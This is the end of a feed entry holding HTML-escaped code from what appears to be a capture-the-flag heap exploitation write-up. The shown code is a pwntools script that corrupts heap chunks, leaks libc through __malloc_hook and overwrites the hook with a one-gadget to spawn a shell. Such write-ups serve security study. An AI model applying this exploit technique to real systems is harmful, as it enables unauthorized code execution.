punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x21&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\x7f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__malloc_hook&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4aed&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attach&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4526a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pause&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-04-17T00:34:11.000Z</updated>
    </entry>
</feed>
